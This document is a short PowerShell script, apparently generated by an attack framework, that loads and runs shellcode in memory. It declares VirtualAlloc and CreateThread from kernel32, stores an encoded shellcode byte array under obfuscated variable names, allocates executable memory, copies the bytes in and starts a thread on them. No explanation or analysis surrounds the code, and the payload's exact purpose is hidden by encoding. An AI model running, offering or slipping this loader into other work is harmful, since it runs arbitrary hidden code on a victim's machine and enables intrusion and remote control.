$rfbaSBLcmKAI = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@

$KgftntrRhlPmhs = Add-Type -memberDefinition $rfbaSBLcmKAI -Name "Win32" -namespace Win32Functions -passthru

[Byte[]] $ApAiBNHm = 0xbb,0x57,0x8e,0x9f,0xba,0xda,0xd1,0xd9,0x74,0x24,0xf4,0x5f,0x29,0xc9,0xb1,0x74,0x31,0x5f,0x14,0x3,0x5f,0x14,0x83,0xef,0xfc,0xb5,0x7b,0x21,0x35,0x45,0x71,0xae,0x93,0x71,0xa0,0x3b,0x0,0x8d,0x9,0xf7,0x81,0xdc,0xc3,0xc6,0x63,0xb,0x9f,0xeb,0x80,0x30,0xed,0xfa,0x6a,0x4c,0xd5,0xd2,0x43,0x4a,0xd0,0x26,0x99,0x71,0xc9,0xb8,0xc7,0x5,0x1d,0xc3,0x30,0x54,0x65,0xbf,0xfa,0xfa,0xad,0xcd,0x35,0x55,0x33,0xc3,0xc4,0x9b,0xe,0x7d,0x6b,0x8c,0x31,0xbb,0x40,0x42,0x74,0x2,0xa6,0xf8,0xe2,0xf6,0x40,0xa5,0x5f,0x52,0x1d,0xdc,0xc9,0xd,0xd2,0x85,0x54,0x74,0x3e,0xa7,0x6c,0x74,0xf4,0x78,0xa,0x56,0x54,0x4a,0xb4,0xde,0x50,0xfe,0x86,0x7a,0x1a,0x7d,0xa4,0x1d,0x44,0x7a,0x90,0x14,0xc1,0xe1,0x13,0x4,0x17,0xc,0x39,0x79,0x19,0x9b,0xe7,0xd7,0x7a,0x4a,0x3c,0x72,0xc8,0x49,0x92,0x97,0x59,0xf,0x26,0x21,0xa6,0xee,0xe0,0x91,0x92,0x43,0x29,0x23,0xfa,0x71,0xef,0xc6,0x37,0x84,0xea,0xed,0x73,0x49,0xcd,0x57,0xc6,0x5,0x6d,0x48,0xc6,0xf2,0x7,0xd5,0x35,0x2b,0xbc,0x54,0x77,0xba,0x59,0x3,0x11,0xe8,0x92,0x54,0x16,0x9,0xce,0x7c,0x9a,0x9,0x58,0xa0,0xf,0xbb,0x27,0x6d,0x9,0x96,0x90,0x3a,0x2a,0xc9,0x74,0xf2,0xee,0x20,0x9c,0x1e,0xef,0x1c,0x2d,0x60,0xdc,0xc6,0x2a,0x3,0x45,0x5e,0x57,0xb1,0xb3,0x43,0x91,0x80,0x28,0xc0,0x8e,0x33,0x40,0x1c,0x27,0x2c,0xec,0x5e,0x5c,0xae,0xbb,0xa2,0x47,0x97,0xae,0x19,0xbc,0x8a,0xe5,0x9e,0x7e,0xf9,0x11,0xaa,0x31,0xae,0xe,0x94,0x8b,0x3c,0x21,0x14,0x15,0xfb,0x8d,0x17,0x44,0x5b,0xde,0xec,0x40,0xb6,0x22,0x47,0xf0,0x63,0xd7,0xed,0x2b,0x93,0x31,0xcc,0x80,0x20,0x44,0x73,0x4a,0x23,0x88,0xe8,0x34,0xca,0xfd,0x2d,0xfc,0x98,0x33,0x9a,0x55,0x48,0xc4,0x8d,0x89,0xf1,0x44,0x42,0x36,0xe6,0x86,0x9c,0xbb,0xdd,0x4f,0xb7,0x70,0xea,0x37,0xd4,0x19,0x66,0x92,0x19,0x57,0x43,0xe,0x94,0x8c,0x45,0xbf,0x8b,0x24,0xa2,0xb8,0x5c,0x79,0xd8,0x4,0x12,0x4b,0xa5,0x3,0x54,0x16,0x67,0x7b,0x39,0xd9,0x10,0x9a,0x8d,0xe4,0x8,0xda,0xe0,0x11,0xe7,0xd,0xfc,0xe,0x94,0x22,0x38,0x73,0x7a,0xc8,0xf6,0x73,0x5d,0x58,0xe7,0x3a,0x47,0x5d,0xa8,0xd2,0x38,0xf8,0x56,0xf4,0xd1,0xb2,0x21,0xa9,0xac,0xd1,0x90,0x53,0x1d,0x20,0xb7,0xa7,0xa1,0xe0,0xb7,0xfb,0x57,0xb8,0x1a,0x8,0x8d,0xf8,0x52,0xe3,0xa0,0x0,0x24,0xb8,0x89,0x7f,0x34,0xa9,0x8e,0xd4,0x1b,0x94,0x4,0x17,0xf4,0x82,0xb,0x3b,0xa8,0xb4,0xd,0x4a,0x7e,0x94,0x40,0x6c,0x5f,0x62,0x60,0x63,0x96,0xa7,0x2d,0x6a,0x98,0xfc,0x25,0x96,0x98,0x97,0x71,0xa4,0xfa,0xe,0xd3,0xbf,0x41,0x84,0xc0,0xda,0xa0,0x6a,0xc1,0x88,0x5d,0xf3,0x35,0x47,0xbe,0xae,0x9b,0xac,0xd6,0xd,0x75,0xe4,0x94,0x3b,0x24,0xe3,0x24,0x19,0xe2,0xfc,0x4f,0x42,0x7e,0x71


$gzLepqxORFyG = $KgftntrRhlPmhs::VirtualAlloc(0,[Math]::Max($ApAiBNHm.Length,0x1000),0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($ApAiBNHm,0,$gzLepqxORFyG,$ApAiBNHm.Length)

$KgftntrRhlPmhs::CreateThread(0,0,$gzLepqxORFyG,0,0,0)
